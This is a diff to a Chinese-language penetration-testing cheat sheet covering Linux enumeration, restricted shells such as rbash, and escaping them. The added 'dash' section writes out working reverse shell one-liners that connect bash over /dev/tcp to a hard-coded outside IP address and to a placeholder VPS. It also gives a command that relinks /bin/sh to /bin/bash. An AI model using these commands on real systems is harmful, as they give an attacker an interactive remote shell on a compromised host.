@@ -20,20 +20,34 @@
 - 主机名 ``hostname``
 - 文件系统 ``df -a``
 - 内核日志 ``dmesg`` / ``/var/log/dmesg``
-- 查看当前shell ``echo $0``
+- 查看当前shell ``echo $0`` ``which sh``
+	+ Restricted Shell
 	
 	::
 	
-		Restricted Shell
 		使用“rbash”，“ - restricted”，“ - r”选项启动任何现有的shell，那么它将成为Restricted shell。
 		Restricted Shell将限制用户执行大多数命令和更改当前工作目录。Restricted Shell将对用户施加以下限制。
 		1.它不允许您执行cd命令。所以你不能去任何地方。您可以简单地留在当前的工作目录中。
 		2.它不允许您修改  $ PATH，$ SHELL，$ BASH_ENV或$ ENV环境变量的值。
-		3.它不允许您执行包含/（斜杠）字符的程序。例如，您无法运行/ usr / bin / uname或./uname命令。但是，您可以执行uname命令。换句话说，您只能在当前路径中运行命令。
+		3.它不允许您执行包含/（斜杠）字符的程序。例如，您无法运行/ usr / bin / uname或./uname命令。
 		4.您无法使用'重定向输出'>'，'> |'，'<>'，'>＆'，'＆>'，'和'>>'重定向运算符。
 		5.它不允许您在脚本中退出受限制的shell模式。
 		6.它不允许您使用'set + r'或'set + o restricted'关闭受限制的shell模式。
 		常见的受限制 shell 有:rbash、rksh、rsh、lshell.
+	
+	+ dash
+	
+	::
+	
+		当 /bin/sh指向/bin/dash的时候，反弹shell用bash的话必须得这样弹：
+		root bash -c "bash -i  >&/dev/tcp/106.13.124.93/2333 0>&1"
+		ubuntu中，当不能指定用户名
+		bash -c "bash -i  >&/dev/tcp/106.13.124.93/2333 0>&1"
+		或者有权限改变/bin/sh的连接指向/bin/bash后：
+		ln -s -f /bin/bash /bin/sh
+		反弹shell可以用最常见的办法： 
+		/bin/bash -i >& /dev/tcp/ip(vps)/7999 0>&1
+		
 - 突破受限shell
 	- 枚举Linux环境
 		
